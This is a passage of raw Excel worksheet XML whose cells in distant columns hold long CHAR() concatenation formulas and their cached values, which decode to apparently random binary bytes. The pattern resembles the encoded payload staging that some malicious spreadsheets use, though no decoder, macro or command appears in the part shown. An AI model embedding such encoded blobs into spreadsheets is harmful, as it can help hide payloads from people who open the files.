;CHAR(187)&amp;CHAR(181)&amp;CHAR(178)&amp;CHAR(123)&amp;CHAR(138)&amp;CHAR(179)&amp;CHAR(85)&amp;CHAR(24)&amp;CHAR(170)&amp;CHAR(194)</f>
        <v>³ÁÕÚù¶UmiœO¿_x0014_¥Û°²rúûJ*_x0012__x000D_z–_x000C__x0018_GŒI×_x0005_?_x001D_Ì¯_x0004_ŒeúÊ^37ç7_x0010__x0002_³G±_x000B_ägæ½˜6ˆeó(_x0006_„+_x000C__x001C_š´´–dü.ÍÁˆoÅã‰š_x0013_£C†_x001D_tHðê:Øñë *?_x0019__x0011_Ã©¶OzT1ç¹|\W=ûz¥/ƒ…º_x0014_éÀô½_x000B__x0007_[lúð¦™£bº­|:Ò¹÷FuÔ0u¥/R¢¯W™Z»{´!_x000C_0æ_x0001_ÈX®ã‹½=£xöDn¾0*ÓÏƒ¤D_x0013_]b_x0007_4ãa _x000B_g_x001A_
Ï›¨$¦ÚEïmñTG²Á&gt;_x0003__x0019_ãˆ÷}àß™'º_x0002_½&lt;_x000C__x0002_r_x001F_ÂìÜ_x0013__x000E_¨_¿Õq»“é»µ²{Š³U_x0018_ªÂ</v>
      </c>
      <c r="DG64" t="str">
        <f>CHAR(173)&amp;CHAR(40)&amp;CHAR(176)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(72)&amp;CHAR(186)&amp;CHAR(53)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>­(°ÎAHº5R×</v>
      </c>
      <c r="DH64" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="65" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF65" t="str">
        <f>CHAR(237)&amp;CHAR(6)&amp;CHAR(226)&amp;CHAR(70)&amp;CHAR(193)&amp;CHAR(199)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(92)&amp;CHAR(216)&amp;CHAR(18)&amp;CHAR(212)&amp;CHAR(180)&amp;CHAR(186)&amp;CHAR(191)&amp;CHAR(88)&amp;CHAR(127)&amp;CHAR(125)&amp;CHAR(32)&amp;CHAR(97)&amp;CHAR(58)&amp;CHAR(203)&amp;CHAR(252)&amp;CHAR(225)&amp;CHAR(164)&amp;CHAR(103)&amp;CHAR(216)&amp;CHAR(248)&amp;CHAR(207)&amp;CHAR(137)&amp;CHAR(90)&amp;CHAR(181)&amp;CHAR(246)&amp;CHAR(156)&amp;CHAR(30)&amp;CHAR(212)&amp;CHAR(1)&amp;CHAR(248)&amp;CHAR(63)&amp;CHAR(113)&amp;CHAR(113)&amp;CHAR(184)&amp;CHAR(241)&amp;CHAR(147)&amp;CHAR(126)&amp;CHAR(11)&amp;CHAR(91)&amp;CHAR(63)&amp;CHAR(31)&amp;CHAR(244)&amp;CHAR(140)&amp;CHAR(229)&amp;CHAR(77)&amp;CHAR(124)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(77)&amp;CHAR(138)&amp;CHAR(224)&amp;CHAR(223)&amp;CHAR(250)&amp;CHAR(241)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(109)&amp;CHAR(53)&amp;CHAR(204)&amp;CHAR(155)&amp;CHAR(176)&amp;CHAR(64)&amp;CHAR(40)&amp;CHAR(151)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(155)&amp;CHAR(224)&amp;CHAR(182)&amp;CHAR(27)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(219)&amp;CHAR(51)&amp;CHAR(105)&amp;CHAR(162)&amp;CHAR(117)&amp;CHAR(124)&amp;CHAR(25)&amp;CHAR(65)&amp;CHAR(145)&amp;CHAR(204)&amp;CHAR(207)&amp;CHAR(194)&amp;CHAR(6)&amp;CHAR(240)&amp;CHAR(176)&amp;CHAR(242)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(142)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(177)&amp;CHAR(216)&amp;CHAR(29)&amp;CHAR(18)&amp;CHAR(216)&amp;CHAR(129)&amp;CHAR(58)&amp;CHAR(76)&amp;CHAR(212)&amp;CHAR(174)&amp;CHAR(156)&amp;CHAR(2)&amp;CHAR(246)&amp;CHAR(106)&amp;CHAR(145)&amp;CHAR(16)&amp;CHAR(130)&amp;CHAR(58)&amp;CHAR(251)&amp;CHAR(43)&amp;CHAR(153)&amp;CHAR(119)&amp;CHAR(249)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(181)&amp;CHAR(171)&amp;CHAR(161)&amp;CHAR(127)&amp;CHAR(88)&amp;CHAR(234)&amp;CHAR(223)&amp;CHAR(99)&amp;CHAR(237)&amp;CHAR(86)&amp;CHAR(220)&amp;CHAR(82)&amp;CHAR(38)&amp;CHAR(142)&amp;CHAR(22)&amp;CHAR(102)&amp;CHAR(212)&amp;CHAR(227)&amp;CHAR(53)&amp;CHAR(48)&amp;CHAR(193)&amp;CHAR(84)&amp;CHAR(186)&amp;CHAR(84)&amp;CHAR(169)&amp;CHAR(3)&amp;CHAR(181)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(229)&amp;CHAR(124)&amp;CHAR(30)&amp;CHAR(80)&amp;CHAR(34)&amp;CHAR(31)&amp;CHAR(86)&amp;CHAR(255)&amp;CHAR(150)&amp;CHAR(83)&amp;CHAR(164)&amp;CHAR(74)&amp;CHAR(70)&amp;CHAR(219)&amp;CHAR(76)&amp;CHAR(190)&amp;CHAR(100)&amp;CHAR(88)&amp;CHAR(227)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(241)&amp;CHAR(167)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(2)&amp;CHAR(99)&amp;CHAR(254)&amp;CHAR(17)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(67)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(175)&amp;CHAR(12)&amp;CHAR(122)&amp;CHAR(227)&amp;CHAR(4)&amp;CHAR(51)&amp;CHAR(3)&amp;CHAR(141)&amp;CHAR(52)&amp;CHAR(250)&amp;CHAR(241)&amp;CHAR(175)&amp;CHAR(172)&amp;CHAR(229)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(157)&amp;CHAR(235)&amp;CHAR(168)&amp;CHAR(220)&amp;CHAR(115)&amp;CHAR(128)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(114)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(114)&amp;CHAR(227)&amp;CHAR(251)&amp;CHAR(85)&amp;CHAR(235)&amp;CHAR(178)&amp;CHAR(26)&amp;CHAR(190)&amp;CHAR(150)&amp;CHAR(213)&amp;CHAR(88)&amp;CHAR(98)&amp;CHAR(104)&amp;CHAR(33)&amp;CHAR(18)&amp;CHAR(158)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(144)&amp;CHAR(234)&amp;CHAR(149)&amp;CHAR(90)&amp;CHAR(137)&amp;CHAR(191)&amp;CHAR(55)&amp;CHAR(195)&amp;CHAR(135)&amp;CHAR(254)&amp;CHAR(157)&amp;CHAR(98)&amp;CHAR(190)&amp;CHAR(218)&amp;CHAR(231)&amp;CHAR(10)&amp;CHAR(20)&amp;CHAR(189)&amp;CHAR(168)&amp;CHAR(139)&amp;CHAR(54)</f>
        <v>í_x0006_âFÁÇZW\Ø_x0012_Ô´º¿X} a:Ëüá¤gØøÏ‰Zµöœ_x001E_Ô_x0001_ø?qq¸ñ“~_x000B_[?_x001F_ôŒåM|!ÁMŠàßúñ_x0002_Çm5Ì›°@(—†•›à¶_x001B_ÖûÛ3i¢u|_x0019_A‘ÌÏÂ_x0006_ð°òûôŽÂ±Ø_x001D__x0012_Ø:LÔ®œ_x0002_öj‘_x0010_‚:û+™wù_x0017_Gµ«¡XêßcíVÜR&amp;Ž_x0016_fÔã50ÁTºT©_x0003_µS‡å|_x001E_P"_x001F_Vÿ–S¤JFÛL¾dXã_x0018__x0002_ñ§zˆ_x0002_cþ_x0011_'_x0001_CÂ!¯_x000C_zã_x0004_3_x0003_4úñ¯¬å‚éë¨Üs€_x0005_Rr©«rãûUë²_x001A_¾–ÕXbh!_x0012_žTúê•Z‰¿7Ã‡þb¾Úç
_x0014_½¨‹6</v>
      </c>
      <c r="DG65" t="str">
        <f>CHAR(213)&amp;CHAR(206)&amp;CHAR(73)&amp;CHAR(186)&amp;CHAR(175)&amp;CHAR(84)&amp;CHAR(219)&amp;CHAR(39)&amp;CHAR(157)&amp;CHAR(11)</f>
        <v>ÕÎIº¯TÛ'_x000B_</v>
      </c>
      <c r="DH65" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="66" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF66" t="str">
        <f>CHAR(208)&amp;CHAR(56)&amp;CHAR(151)&amp;CHAR(141)&amp;CHAR(166)&amp;CHAR(50)&amp;CHAR(44)&amp;CHAR(192)&amp;CHAR(58)&amp;CHAR(117)&amp;CHAR(35)&amp;CHAR(241)&amp;CHAR(61)&amp;CHAR(50)&amp;CHAR(121)&amp;CHAR(198)&amp;CHAR(161)&amp;CHAR(89)&amp;CHAR(117)&amp;CHAR(191)&amp;CHAR(62)&amp;CHAR(81)&amp;CHAR(210)&amp;CHAR(64)&amp;CHAR(16)&amp;CHAR(5)&amp;CHAR(57)&amp;CHAR(218)&amp;CHAR(248)&amp;CHAR(223)&amp;CHAR(18)&amp;CHAR(153)&amp;CHAR(109)&amp;CHAR(114)&amp;CHAR(94)&amp;CHAR(27)&amp;CHAR(111)&amp;CHAR(214)&amp;CHAR(229)&amp;CHAR(222)&amp;CHAR(44)&amp;CHAR(120)&amp;CHAR(166)&amp;CHAR(197)&amp;CHAR(130)&amp;CHAR(71)&amp;CHAR(78)&amp;CHAR(205)&amp;CHAR(202)&amp;CHAR(192)&amp;CHAR(16)&amp;CHAR(46)&amp;CHAR(195)&amp;CHAR(41)&amp;CHAR(60)&amp;CHAR(47)&amp;CHAR(150)&amp;CHAR(89)&amp;CHAR(37)&amp;CHAR(107)&amp;CHAR(217)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(130)&amp;CHAR(135)&amp;CHAR(230)&amp;CHAR(35)&amp;CHAR(181)&amp;CHAR(79)&amp;CHAR(92)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(76)&amp;CHAR(31)&amp;CHAR(9)&amp;CHAR(66)&amp;CHAR(167)&amp;CHAR(109)&amp;CHAR(21)&amp;CHAR(254)&amp;CHAR(246)&amp;CHAR(136)&amp;CHAR(128)&amp;CHAR(17)&amp;CHAR(136)&amp;CHAR(149)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(34)&amp;CHAR(206)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(226)&amp;CHAR(245)&amp;CHAR(235)&amp;CHAR(132)&amp;CHAR(207)&amp;CHAR(245)&amp;CHAR(120)&amp;CHAR(185)&amp;CHAR(181)&amp;CHAR(53)&amp;CHAR(189)&amp;CHAR(210)&amp;CHAR(120)&amp;CHAR(142)&amp;CHAR(85)&amp;CHAR(183)&amp;CHAR(135)&amp;CHAR(94)&amp;CHAR(127)&amp;CHAR(73)&amp;CHAR(172)&amp;CHAR(169)&amp;CHAR(3)&amp;CHAR(201)&amp;CHAR(226)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(249)&amp;CHAR(149)&amp;CHAR(45)&amp;CHAR(212)&amp;CHAR(163)&amp;CHAR(217)&amp;CHAR(110)&amp;CHAR(118)&amp;CHAR(101)&amp;CHAR(253)&amp;CHAR(204)&amp;CHAR(147)&amp;CHAR(49)&amp;CHAR(114)&amp;CHAR(93)&amp;CHAR(207)&amp;CHAR(255)&amp;CHAR(174)&amp;CHAR(235)&amp;CHAR(141)&amp;CHAR(218)&amp;CHAR(248)&amp;CHAR(41)&amp;CHAR(73)&amp;CHAR(157)&amp;CHAR(45)&amp;CHAR(172)&amp;CHAR(53)&amp;CHAR(120)&amp;CHAR(75)&amp;CHAR(86)&amp;CHAR(127)&amp;CHAR(250)&amp;CHAR(7)&amp;CHAR(254)&amp;CHAR(199)&amp;CHAR(92)&amp;CHAR(107)&amp;CHAR(85)&amp;CHAR(163)&amp;CHAR(36)&amp;CHAR(78)&amp;CHAR(185)&amp;CHAR(130)&amp;CHAR(178)&amp;CHAR(182)&amp;CHAR(180)&amp;CHAR(164)&amp;CHAR(26)&amp;CHAR(179)&amp;CHAR(25)&amp;CHAR(81)&amp;CHAR(67)&amp;CHAR(222)&amp;CHAR(57)&amp;CHAR(198)&amp;CHAR(143)&amp;CHAR(190)&amp;CHAR(97)&amp;CHAR(41)&amp;CHAR(58)&amp;CHAR(227)&amp;CHAR(64)&amp;CHAR(104)&amp;CHAR(130)&amp;CHAR(21)&amp;CHAR(208)&amp;CHAR(28)&amp;CHAR(227)&amp;CHAR(217)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(143)&amp;CHAR(140)&amp;CHAR(216)&amp;CHAR(243)&amp;CHAR(121)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(186)&amp;CHAR(100)&amp;CHAR(62)&amp;CHAR(207)&amp;CHAR(169)&amp;CHAR(240)&amp;CHAR(99)&amp;CHAR(144)&amp;CHAR(86)&amp;CHAR(35)&amp;CHAR(165)&amp;CHAR(42)&amp;CHAR(96)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(115)&amp;CHAR(54)&amp;CHAR(77)&amp;CHAR(9)&amp;CHAR(154)&amp;CHAR(69)&amp;CHAR(200)&amp;CHAR(91)&amp;CHAR(199)&amp;CHAR(129)&amp;CHAR(121)&amp;CHAR(129)&amp;CHAR(129)&amp;CHAR(253)&amp;CHAR(76)&amp;CHAR(109)&amp;CHAR(133)&amp;CHAR(68)&amp;CHAR(153)&amp;CHAR(217)&amp;CHAR(168)&amp;CHAR(119)&amp;CHAR(115)&amp;CHAR(127)&amp;CHAR(218)&amp;CHAR(65)&amp;CHAR(253)&amp;CHAR(105)&amp;CHAR(163)&amp;CHAR(41)&amp;CHAR(202)&amp;CHAR(243)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(151)&amp;CHAR(38)&amp;CHAR(44)&amp;CHAR(66)&amp;CHAR(93)&amp;CHAR(143)</f>
        <v>Ð8—¦2,À:u#ñ=2yÆ¡Yu¿&gt;QÒ@_x0010__x0005_9Úøß_x0012_™mr^_x001B_oÖåÞ,x¦Å‚GNÍÊÀ_x0010_.Ã)&lt;/–Y%kÙŒO‚‡æ#µO\&gt;»L_x001F_	B§m_x0015_þöˆ€_x0011_ˆ•R€"ÎS×âõë„Ïõx¹µ5½ÒxŽU·‡^I¬©_x0003_Éâ(*ù•-Ô£ÙnveýÌ“1r]Ïÿ®ëÚø)I-¬5xKVú_x0007_þÇ\kU£$N¹‚²¶´¤_x001A_³_x0019_QCÞ9Æ¾a):ã@h‚_x0015_Ð_x001C_ãÙ_x000B__x000D_ŒØóy_x000B__x000D_ºd&gt;Ï©ðcV#¥*`us6M	šEÈ[ÇyýLm…D™Ù¨wsÚAýi£)Êóc¼F€—&amp;,B]</v>
      </c>
      <c r="DG66" t="str">
        <f>CHAR(223)&amp;CHAR(29)&amp;CHAR(153)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(88)&amp;CHAR(139)&amp;CHAR(247)&amp;CHAR(122)</f>
        <v>ß_x001D_™_x001D_RŸX‹÷z</v>
      </c>
      <c r="DH66" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="67" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF67" t="str">
        <f>CHAR(6)&amp;CHAR(23)&amp;CHAR(114)&amp;CHAR(144)&amp;CHAR(63)&amp;CHAR(109)&amp;CHAR(27)&amp;CHAR(237)&amp;CHAR(113)&amp;CHAR(126)&amp;CHAR(48)&amp;CHAR(183)&amp;CHAR(203)&amp;CHAR(163)&amp;CHAR(76)&amp;CHAR(243)&amp;CHAR(180)&amp;CHAR(102)&amp;CHAR(201)&amp;CHAR(54)&amp;CHAR(13)&amp;CHAR(192)&amp;CHAR(14)&amp;CHAR(248)&amp;CHAR(112)&amp;CHAR(228)&amp;CHAR(213)&amp;CHAR(175)&amp;CHAR(194)&amp;CHAR(29)&amp;CHAR(108)&amp;CHAR(75)&amp;CHAR(63)&amp;CHAR(169)&amp;CHAR(6)&amp;CHAR(32)&amp;CHAR(50)&amp;CHAR(230)&amp;CHAR(2)&amp;CHAR(244)&amp;CHAR(120)&amp;CHAR(154)&amp;CHAR(229)&amp;CHAR(161)&amp;CHAR(55)&amp;CHAR(237)&amp;CHAR(2)&amp;CHAR(163)&amp;CHAR(21)&amp;CHAR(14)&amp;CHAR(77)&amp;CHAR(179)&amp;CHAR(109)&amp;CHAR(6)&amp;CHAR(177)&amp;CHAR(251)&amp;CHAR(61)&amp;CHAR(52)&amp;CHAR(68)&amp;CHAR(67)&amp;CHAR(143)&amp;CHAR(90)&amp;CHAR(90)&amp;CHAR(156)&amp;CHAR(114)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(97)&amp;CHAR(44)&amp;CHAR(112)&amp;CHAR(145)&amp;CHAR(172)&amp;CHAR(122)&amp;CHAR(94)&amp;CHAR(191)&amp;CHAR(80)&amp;CHAR(203)&amp;CHAR(74)&amp;CHAR(254)&amp;CHAR(220)&amp;CHAR(12)&amp;CHAR(95)&amp;CHAR(252)&amp;CHAR(141)&amp;CHAR(25)&amp;CHAR(55)&amp;CHAR(96)&amp;CHAR(29)&amp;CHAR(53)&amp;CHAR(233)&amp;CHAR(167)&amp;CHAR(75)&amp;CHAR(21)&amp;CHAR(226)&amp;CHAR(209)&amp;CHAR(65)&amp;CHAR(16)&amp;CHAR(36)&amp;CHAR(86)&amp;CHAR(54)&amp;CHAR(141)&amp;CHAR(17)&amp;CHAR(96)&amp;CHAR(102)&amp;CHAR(62)&amp;CHAR(211)&amp;CHAR(151)&amp;CHAR(2)&amp;CHAR(103)&amp;CHAR(229)&amp;CHAR(239)&amp;CHAR(37)&amp;CHAR(103)&amp;CHAR(215)&amp;CHAR(68)&amp;CHAR(106)&amp;CHAR(97)&amp;CHAR(219)&amp;CHAR(250)&amp;CHAR(208)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(24)&amp;CHAR(152)&amp;CHAR(108)&amp;CHAR(225)&amp;CHAR(146)&amp;CHAR(230)&amp;CHAR(239)&amp;CHAR(195)&amp;CHAR(25)&amp;CHAR(68)&amp;CHAR(99)&amp;CHAR(102)&amp;CHAR(199)&amp;CHAR(99)&amp;CHAR(20)&amp;CHAR(147)&amp;CHAR(94)&amp;CHAR(213)&amp;CHAR(228)&amp;CHAR(54)&amp;CHAR(80)&amp;CHAR(247)&amp;CHAR(46)&amp;CHAR(144)&amp;CHAR(55)&amp;CHAR(64)&amp;CHAR(80)&amp;CHAR(138)&amp;CHAR(116)&amp;CHAR(254)&amp;CHAR(145)&amp;CHAR(217)&amp;CHAR(125)&amp;CHAR(230)&amp;CHAR(190)&amp;CHAR(205)&amp;CHAR(107)&amp;CHAR(103)&amp;CHAR(147)&amp;CHAR(156)&amp;CHAR(249)&amp;CHAR(37)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(227)&amp;CHAR(173)&amp;CHAR(171)&amp;CHAR(202)&amp;CHAR(29)&amp;CHAR(96)&amp;CHAR(197)&amp;CHAR(198)&amp;CHAR(65)&amp;CHAR(4)&amp;CHAR(185)&amp;CHAR(214)&amp;CHAR(133)&amp;CHAR(81)&amp;CHAR(77)&amp;CHAR(17)&amp;CHAR(15)&amp;CHAR(117)&amp;CHAR(72)&amp;CHAR(162)&amp;CHAR(231)&amp;CHAR(191)&amp;CHAR(104)&amp;CHAR(235)&amp;CHAR(183)&amp;CHAR(237)&amp;CHAR(193)&amp;CHAR(206)&amp;CHAR(201)&amp;CHAR(200)&amp;CHAR(138)&amp;CHAR(55)&amp;CHAR(42)&amp;CHAR(16)&amp;CHAR(82)&amp;CHAR(154)&amp;CHAR(192)&amp;CHAR(36)&amp;CHAR(75)&amp;CHAR(119)&amp;CHAR(109)&amp;CHAR(245)&amp;CHAR(207)&amp;CHAR(181)&amp;CHAR(216)&amp;CHAR(109)&amp;CHAR(65)&amp;CHAR(249)&amp;CHAR(187)&amp;CHAR(78)&amp;CHAR(158)&amp;CHAR(166)&amp;CHAR(207)&amp;CHAR(60)&amp;CHAR(41)&amp;CHAR(80)&amp;CHAR(65)&amp;CHAR(148)&amp;CHAR(50)&amp;CHAR(225)&amp;CHAR(145)&amp;CHAR(196)&amp;CHAR(33)&amp;CHAR(194)&amp;CHAR(91)&amp;CHAR(14)&amp;CHAR(81)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(220)&amp;CHAR(178)&amp;CHAR(94)&amp;CHAR(36)&amp;CHAR(193)&amp;CHAR(49)&amp;CHAR(18)&amp;CHAR(106)&amp;CHAR(245)&amp;CHAR(161)&amp;CHAR(40)&amp;CHAR(225)&amp;CHAR(97)&amp;CHAR(82)&amp;CHAR(150)&amp;CHAR(91)&amp;CHAR(155)&amp;CHAR(204)&amp;CHAR(32)&amp;CHAR(224)</f>
        <v>_x0006__x0017_r?m_x001B_íq~0·Ë£Ló´fÉ6_x000D_À_x000E_øpäÕ¯Â_x001D_lK?©_x0006_ 2æ_x0002_ôxšå¡7í_x0002_£_x0015__x000E_M³m_x0006_±û=4DCZZœr´_x000C_a,p‘¬z^¿PËJþÜ_x000C__ü_x0019_7`_x001D_5é§K_x0015_âÑA_x0010_$V6_x0011_`f&gt;Ó—_x0002_gåï%g×DjaÛúÐç÷_x0018_˜lá’æïÃ_x0019_DcfÇc_x0014_“^Õä6P÷.7@PŠtþ‘Ù}æ¾Íkg“œù%YZã­«Ê_x001D_`ÅÆA_x0004_¹Ö…QM_x0011__x000F_uH¢ç¿hë·íÁÎÉÈŠ7*_x0010_RšÀ$KwmõÏµØmAù»Nž¦Ï&lt;)PA”2á‘Ä!Â[_x000E_QÀ³Ü²^$Á1_x0012_jõ¡(áaR–[›Ì à</v>
      </c>
      <c r="DG67" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(186)&amp;CHAR(78)&amp;CHAR(40)&amp;CHAR(121)&amp;CHAR(53)&amp;CHAR(25)&amp;CHAR(215)&amp;CHAR(150)</f>
        <v>Ÿ_x001D_ºN(y5_x0019_×–</v>
      </c>
      <c r="DH67" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="68" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF68" t="str">
        <f>CHAR(241)&amp;CHAR(181)&amp;CHAR(8)&amp;CHAR(99)&amp;CHAR(223)&amp;CHAR(22)&amp;CHAR(31)&amp;CHAR(99)&amp;CHAR(97)&amp;CHAR(254)&amp;CHAR(58)&amp;CHAR(227)&amp;CHAR(62)&amp;CHAR(193)&amp;CHAR(95)&amp;CHAR(161)&amp;CHAR(57)&amp;CHAR(226)&amp;CHAR(228)&amp;CHAR(45)&amp;CHAR(85)&amp;CHAR(193)&amp;CHAR(90)&amp;CHAR(112)&amp;CHAR(207)&amp;CHAR(55)&amp;CHAR(69)&amp;CHAR(24)&amp;CHAR(128)&amp;CHAR(63)&amp;CHAR(254)&amp;CHAR(70)&amp;CHAR(220)&amp;CHAR(156)&amp;CHAR(3)&amp;CHAR(109)&amp;CHAR(46)&amp;CHAR(69)&amp;CHAR(117)&amp;CHAR(188)&amp;CHAR(9)&amp;CHAR(148)&amp;CHAR(171)&amp;CHAR(27)&amp;CHAR(20)&amp;CHAR(95)&amp;CHAR(133)&amp;CHAR(133)&amp;CHAR(144)&amp;CHAR(55)&amp;CHAR(223)&amp;CHAR(142)&amp;CHAR(89)&amp;CHAR(252)&amp;CHAR(114)&amp;CHAR(180)&amp;CHAR(40)&amp;CHAR(88)&amp;CHAR(118)&amp;CHAR(201)&amp;CHAR(246)&amp;CHAR(225)&amp;CHAR(230)&amp;CHAR(13)&amp;CHAR(232)&amp;CHAR(206)&amp;CHAR(129)&amp;CHAR(30)&amp;CHAR(188)&amp;CHAR(177)&amp;CHAR(3)&amp;CHAR(124)&amp;CHAR(43)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(14)&amp;CHAR(240)&amp;CHAR(57)&amp;CHAR(48)&amp;CHAR(121)&amp;CHAR(194)&amp;CHAR(58)&amp;CHAR(215)&amp;CHAR(82)&amp;CHAR(23)&amp;CHAR(28)&amp;CHAR(49)&amp;CHAR(83)&amp;CHAR(140)&amp;CHAR(212)&amp;CHAR(72)&amp;CHAR(23)&amp;CHAR(198)&amp;CHAR(32)&amp;CHAR(246)&amp;CHAR(198)&amp;CHAR(43)&amp;CHAR(172)&amp;CHAR(248)&amp;CHAR(186)&amp;CHAR(148)&amp;CHAR(104)&amp;CHAR(79)&amp;CHAR(160)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(119)&amp;CHAR(81)&amp;CHAR(139)&amp;CHAR(117)&amp;CHAR(75)&amp;CHAR(199)&amp;CHAR(214)&amp;CHAR(247)&amp;CHAR(244)&amp;CHAR(147)&amp;CHAR(144)&amp;CHAR(71)&amp;CHAR(224)&amp;CHAR(107)&amp;CHAR(3)&amp;CHAR(145)&amp;CHAR(201)&amp;CHAR(250)&amp;CHAR(147)&amp;CHAR(208)&amp;CHAR(207)&amp;CHAR(228)&amp;CHAR(69)&amp;CHAR(54)&amp;CHAR(100)&amp;CHAR(2)&amp;CHAR(25)&amp;CHAR(41)&amp;CHAR(70)&amp;CHAR(204)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(152)&amp;CHAR(10)&amp;CHAR(196)&amp;CHAR(29)&amp;CHAR(117)&amp;CHAR(138)&amp;CHAR(100)&amp;CHAR(80)&amp;CHAR(142)&amp;CHAR(212)&amp;CHAR(232)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(56)&amp;CHAR(113)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(111)&amp;CHAR(205)&amp;CHAR(223)&amp;CHAR(30)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(79)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(101)&amp;CHAR(216)&amp;CHAR(137)&amp;CHAR(168)&amp;CHAR(180)&amp;CHAR(196)&amp;CHAR(185)&amp;CHAR(183)&amp;CHAR(92)&amp;CHAR(128)&amp;CHAR(229)&amp;CHAR(58)&amp;CHAR(124)&amp;CHAR(234)&amp;CHAR(113)&amp;CHAR(42)&amp;CHAR(93)&amp;CHAR(175)&amp;CHAR(5)&amp;CHAR(72)&amp;CHAR(32)&amp;CHAR(35)&amp;CHAR(89)&amp;CHAR(59)&amp;CHAR(85)&amp;CHAR(145)&amp;CHAR(225)&amp;CHAR(231)&amp;CHAR(101)&amp;CHAR(149)&amp;CHAR(178)&amp;CHAR(60)&amp;CHAR(60)&amp;CHAR(222)&amp;CHAR(20)&amp;CHAR(20)&amp;CHAR(192)&amp;CHAR(14)&amp;CHAR(171)&amp;CHAR(196)&amp;CHAR(90)&amp;CHAR(7)&amp;CHAR(193)&amp;CHAR(41)&amp;CHAR(78)&amp;CHAR(185)&amp;CHAR(62)&amp;CHAR(245)&amp;CHAR(105)&amp;CHAR(47)&amp;CHAR(10)&amp;CHAR(68)&amp;CHAR(245)&amp;CHAR(137)&amp;CHAR(25)&amp;CHAR(162)&amp;CHAR(226)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(8)&amp;CHAR(247)&amp;CHAR(128)&amp;CHAR(221)&amp;CHAR(132)&amp;CHAR(153)&amp;CHAR(39)&amp;CHAR(72)&amp;CHAR(121)&amp;CHAR(192)&amp;CHAR(114)&amp;CHAR(228)&amp;CHAR(119)&amp;CHAR(218)&amp;CHAR(140)&amp;CHAR(163)&amp;CHAR(87)&amp;CHAR(55)&amp;CHAR(109)&amp;CHAR(211)&amp;CHAR(247)&amp;CHAR(140)&amp;CHAR(84)&amp;CHAR(199)&amp;CHAR(96)&amp;CHAR(194)&amp;CHAR(214)&amp;CHAR(2)&amp;CHAR(165)&amp;CHAR(139)</f>
        <v>ñµ_x0008_cß_x0016__x001F_caþ:ã&gt;Á_¡9âä-UÁZpÏ7E_x0018_€?þFÜœ_x0003_m.Eu¼	”«_x001B__x0014__……7ßŽYür´(XvÉöáæ_x000D_èÎ_x001E_¼±_x0003_|+«»WW_x000E_ð90yÂ:×R_x0017__x001C_1SŒÔH_x0017_Æ öÆ+¬øº”hO %ûwQ‹uKÇÖ÷ô“Gàk_x0003_‘Éú“ÐÏäE6d_x0002__x0019_)FÌª[˜
Ä_x001D_uŠdPŽÔèF.8qXUoÍß_x001E_¥³O_x001E__x0006_eØ‰¨´Ä¹·\€å:|êq*]¯_x0005_H #Y;U‘áçe•²&lt;&lt;Þ_x0014__x0014_À_x000E_«ÄZ_x0007_Á)N¹&gt;õi/
Dõ‰_x0019_¢âÐÖ_x0008_÷€Ý„™'HyÀräwÚŒ£W7mÓ÷ŒTÇ`ÂÖ_x0002_¥‹</v>
      </c>
      <c r="DG68" t="str">
        <f>CHAR(102)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(158)&amp;CHAR(148)&amp;CHAR(239)</f>
        <v>fòý†Ê|×ž”ï</v>
      </c>
      <c r="DH68" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="69" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF69" t="str">
